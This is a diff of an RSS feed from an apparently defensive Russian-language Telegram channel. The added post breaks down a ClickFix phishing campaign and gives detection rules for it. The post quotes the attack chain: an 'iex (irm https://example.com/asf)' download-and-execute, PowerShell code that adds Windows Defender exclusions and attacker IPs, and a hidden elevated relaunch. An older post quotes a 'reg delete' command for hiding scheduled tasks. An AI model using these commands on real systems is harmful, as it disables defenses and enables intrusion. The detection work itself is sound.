@@ -1,5 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Detection is easy</title><link>https://t.me/detectioneasy</link><description>Detections</description><language>ru</language><lastBuildDate>Wed, 26 Nov 2025 13:54:16 +0000</lastBuildDate><item><title>PT выпустили описание техник APT31, которые активно используют скрытые задачи планировщика Windows</title><link>https://t.me/detectioneasy/295</link><description>Всем привет! 💻✌️
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Detection is easy</title><link>https://t.me/detectioneasy</link><description>Detections</description><language>ru</language><lastBuildDate>Thu, 27 Nov 2025 19:55:25 +0000</lastBuildDate><item><title>Давайте разберем способы обхода обнаружения, которые применялись в фишинговой кампании</title><link>https://t.me/detectioneasy/296</link><description>Всем привет! 💻✌️
+Давайте разберем способы обхода обнаружения, которые применялись в фишинговой кампании
+👨‍💻 Посмотрим TTP:
+🔤Атака начинается с ClickFix (имитируется обновление системы: синий экран с процентами - всё привычно), в результате чего запускается удалённый скрипт через mshta.exe
+🔤Приложение hta запускает powershell.exe с командлетами iex (irm https://example.com/asf)
+🔤Теперь самое интересное. Скачанный ps1 начинает свою работу с повышения привилегий (UAC) и добавления исключений в Windows Defender
+$uQVLE622ThHArk = "Add-MpPreference -ExclusionPath 'C:\Windows\Temp'"
+$uQVLE622ThHArk +=
+"; Add-MpPreference -ExclusionPath '$env:WINDIR"
+$uQVLE622ThHArk +=
+; Add-MpPreference -ExclusionPath '$env: TEMP"
+$uQVLE622ThHArk +=
+Add-MpPreference -ExclusionPath '$env: USERPROFILE"
+$uQVLE622ThHArk +=
+Add-MpPreference -ExclusionPath '$env:APPDATA"
+$uQVLE622ThHArk += ";
+Add-MpPreference -ExclusionPath '$env: LOCALAPPDATA"
+$uQVLE622ThHArk += "; Add-MpPreference -ExclusionIpAddress '178.16.55.189', '94.154.35. 25'
+🔤Для повышения привилегий атакующие запускают powershell.exe с аргументом -Verb RunAs
+$aXNXjSqHUpLoYk = Start-Process powershell.exe
+-ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass - Command
+`$ErrorActionPreference='Stop'; $uQVLE622ThHArk" `
+-Verb RunAs `
+-﻿PassThru
+И, судя по отчёту, этот функционал запускается в цикле до тех пор, пока пользователь не согласится выдать привилегии
+🔤Последним этапом идёт установка RAT или стилера
+🔭 Обнаружение:
+🔤 отслеживаем аргументы powershell Add-MpPreference, Set-MpPreference, -Exclusion*
+🔤 отслеживаем создание новых значений в ключах реестра HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\
+🔤 отслеживаем события
+ProviderName = "Microsoft-Windows-Windows Defender/Operational" AND EventId=5007 AND NewValue contains "Microsoft\Windows Defender\Exclusions"
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Thu, 27 Nov 2025 19:55:25 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_296</guid></item><item><title>PT выпустили описание техник APT31, которые активно используют скрытые задачи планировщика Windows</title><link>https://t.me/detectioneasy/295</link><description>Всем привет! 💻✌️
 PT выпустили описание техник APT31, которые активно используют скрытые задачи планировщика Windows
 Для создания скрытой задачи необходимо удалить файл XML и ключ реестра SD (SecurityDescriptor) соответствующей задачи:
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TEST_TASK" /v SD /f
